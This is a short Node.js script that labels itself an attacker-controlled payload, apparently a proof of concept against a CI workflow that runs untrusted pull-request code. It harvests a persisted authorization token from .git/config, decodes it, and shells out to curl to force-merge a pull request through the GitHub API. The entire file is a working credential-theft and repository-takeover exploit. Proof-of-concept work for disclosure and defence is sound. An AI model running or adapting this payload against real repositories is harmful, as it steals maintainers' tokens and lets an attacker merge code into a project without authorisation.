const fs = require('fs');
const { execSync } = require('child_process');
console.log('PAYLOAD: attacker-controlled add-to-registry.js executed in ' + process.cwd());
var tok = null;
try {
  var cfg = fs.readFileSync('.git/config', 'utf8');
  var m = cfg.match(/AUTHORIZATION: basic (\S+)/i);
  if (m) { var d = Buffer.from(m[1], 'base64').toString(); tok = d.split(':').slice(1).join(':'); }
} catch (e) {}
console.log('PAYLOAD: token harvested from .git/config = ' + !!tok);
if (tok) {
  var pr = process.env.POC_PR || '1';
  var url = 'https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/pulls/' + pr + '/merge';
  var cmd = 'curl -sS -o /tmp/merge.json -w %{http_code} -X PUT -H ' + JSON.stringify('Authorization: Bearer ' + tok) +
    ' -H ' + JSON.stringify('Accept: application/vnd.github+json') + ' ' + JSON.stringify(url) +
    ' -d ' + JSON.stringify('{"merge_method":"merge"}');
  console.log('PAYLOAD: merge HTTP status = ' + execSync(cmd, { encoding: 'utf8' }));
  console.log('PAYLOAD: merge response = ' + fs.readFileSync('/tmp/merge.json', 'utf8'));
}
